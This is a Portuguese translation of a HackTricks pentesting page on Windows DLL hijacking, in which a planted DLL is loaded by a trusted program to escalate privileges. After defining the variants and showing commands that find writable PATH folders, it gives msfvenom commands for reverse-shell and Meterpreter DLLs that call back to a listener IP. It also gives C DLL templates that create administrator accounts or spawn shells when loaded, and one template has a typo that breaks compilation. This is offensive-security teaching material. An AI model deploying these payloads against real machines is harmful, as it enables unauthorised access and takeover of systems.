# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em **carreira de hacking** e hackear o impossível - **estamos contratando!** (_fluência em polonês escrito e falado é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definição

Antes de tudo, vamos definir o que é. O sequestro de DLL é, em sentido amplo, **enganar um aplicativo legítimo/confiável para carregar uma DLL arbitrária**. Termos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ e _DLL Side-Loading_ são frequentemente - erroneamente - usados para dizer o mesmo.

O sequestro de DLL pode ser usado para **executar** código, obter **persistência** e **escalar privilégios**. Dos três, o **menos provável** de encontrar é a **escalada de privilégios** de longe. No entanto, como isso faz parte da seção de escalada de privilégios, vou me concentrar nessa opção. Além disso, observe que, independentemente do objetivo, um sequestro de DLL é realizado da mesma maneira.

### Tipos

Existem **várias abordagens** para escolher, com o sucesso dependendo de como o aplicativo é configurado para carregar suas DLLs necessárias. As abordagens possíveis incluem:

1. **Substituição de DLL**: substituir uma DLL legítima por uma DLL maliciosa. Isso pode ser combinado com _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], que garante que toda a funcionalidade da DLL original permaneça intacta.
2. **DLL search order hijacking**: DLLs especificadas por um aplicativo sem um caminho são procuradas em locais fixos em uma ordem específica \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. O sequestro da ordem de pesquisa ocorre colocando a DLL maliciosa em um local que é pesquisado antes da DLL real. Isso às vezes inclui o diretório de trabalho do aplicativo de destino.
3. **Phantom DLL hijacking**: deixar uma DLL maliciosa no lugar de uma DLL ausente/inexistente que um aplicativo legítimo tenta carregar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirecionamento de DLL**: alterar o local em que a DLL é procurada, por exemplo, editando a variável de ambiente `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para incluir a pasta que contém a DLL maliciosa \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar as importações de um executável e as exportações de uma dll com:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar do Dll Hijacking para escalar privilégios** com permissões para escrever em uma pasta **System Path**, verifique:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de gravação em qualquer pasta dentro do sistema PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que o Dll Hijacking é útil para [escalar do nível de integridade Médio para Alto **(burlando o UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alto para SYSTEM**](./#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo de hijacking de dll focado em hijacking de dll para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos básicos de dll** que podem ser úteis como **modelos** ou para criar uma **dll com funções não exigidas exportadas**.

## **Criando e compilando Dlls**

### **Proxificação de Dll**

Basicamente, um **proxy de Dll** é uma Dll capaz de **executar seu código malicioso quando carregado**, mas também de **expor** e **funcionar** como **esperado**, **repassando todas as chamadas para a biblioteca real**.

Com a ferramenta **** [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) **** ou **** [**Spartacus**](https://github.com/Accenture/Spartacus) ****, você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter shell reverso (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obter um meterpreter (x86):**

Para obter um meterpreter (x86): 

1. Compile o seguinte código em um arquivo DLL:

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k \"C:\\Workspace\\Tools\\Meterpreter.exe\"");
    }
    return TRUE;
}
```

2. Salve o arquivo como `mydll.dll`.
3. Copie o arquivo `mydll.dll` para um diretório que esteja no PATH do sistema.
4. Reinicie o serviço que carrega a DLL ou reinicie o sistema.
5. Quando a DLL for carregada, o Meterpreter será executado.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Próprio

Observe que em vários casos, o Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo vítima, se essas funções não existirem, o **binário não poderá carregá-las** e o **exploit falhará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em uma **carreira de hacker** e quer hackear o que não pode ser hackeado - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
